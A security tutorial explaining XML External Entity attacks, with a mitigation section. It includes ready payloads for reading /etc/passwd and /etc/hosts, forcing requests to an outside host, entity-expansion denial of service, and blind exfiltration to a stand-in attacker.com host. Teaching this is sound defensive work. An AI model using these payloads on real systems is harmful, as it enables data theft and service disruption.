# üõ†Ô∏è XML External Entity (XXE) Vulnerability

## üìú Overview

**XML External Entity (XXE)** is a type of attack targeting applications that process XML input. If an application improperly handles or allows the use of external entities, attackers can exploit it to:

- Access sensitive information on the server.
- Execute remote code.
- Perform denial-of-service (DoS) attacks.
- Compromise system integrity and availability.

## üîç How It Works

1. **Definition of External XML Entities**
   XML allows the use of external entities, which are special tags used to include external data or resources.

2. **Improper Processing**
   If the application does not validate or filter XML input, malicious external entities can be executed.

3. **Exploitation**
   Attackers can use XXE to exfiltrate data, interact with local files, or execute remote HTTP requests by injecting malicious entities.

## ‚öôÔ∏è Types of XXE Attacks

1. **File Disclosure**
   Access sensitive files on the server, such as configuration files or private keys.

   **Example Payload:**
   ```xml
   <!DOCTYPE root [
     <!ENTITY xxe SYSTEM "file:///etc/passwd">
   ]>
   <root>
     <data>&xxe;</data>
   </root>
   ```

2. **Server-Side Request Forgery (SSRF)**
   Force the server to make HTTP requests to arbitrary addresses.

   **Example Payload:**
   ```xml
   <!DOCTYPE root [
     <!ENTITY xxe SYSTEM "http://malicious-site.com/malware">
   ]>
   <root>
     <data>&xxe;</data>
   </root>
   ```

3. **Denial of Service (DoS)**
   Use large or recursive payloads to overwhelm the parser and crash the server.

   **Example Payload:**
   ```xml
   <!DOCTYPE root [
     <!ENTITY a "b">
     <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
   ]>
   <root>
     <data>&b;</data>
   </root>
   ```

4. **Blind XXE**
   Scenarios where the attacker cannot directly view the response but can send external requests to observe behavior.

   **Example Payload:**
   ```xml
   <!DOCTYPE root [
     <!ENTITY xxe SYSTEM "http://attacker.com/log?data=exfiltrated">
   ]>
   <root>
     <data>&xxe;</data>
   </root>
   ```

## ‚ö†Ô∏è Example Scenario

For example, consider a shopping application that checks product stock levels by sending the following XML to the server:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

Imagine an application that accepts XML to configure user settings:

- An attacker submits XML with an external entity.
- The server processes the entity and exposes sensitive data.

**Example Payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hosts">
]>
<foo>&xxe;</foo>
```

The attacker retrieves the contents of the `/etc/hosts` file.

## üõ°Ô∏è Mitigation Strategies

1. **Disable External Entity Processing**
   Configure your XML parser to disable processing of external entities. For example, in Java:
   ```java
   DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
   dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
   ```

2. **Use Secure Libraries**
   Use libraries that process XML securely, such as `defusedxml` in Python.

3. **Input Validation**
   Validate and sanitize all XML inputs before processing.

4. **Set Proper Access Permissions**
   Restrict access to sensitive files and resources that could be exploited.

5. **Monitoring and Logging**
   Detect suspicious activity by monitoring unusual file or network access patterns.

## üìö Conclusion

XXE vulnerabilities pose a serious threat to applications that process XML. Understanding how these attacks work and implementing robust security measures can protect your applications and their users.
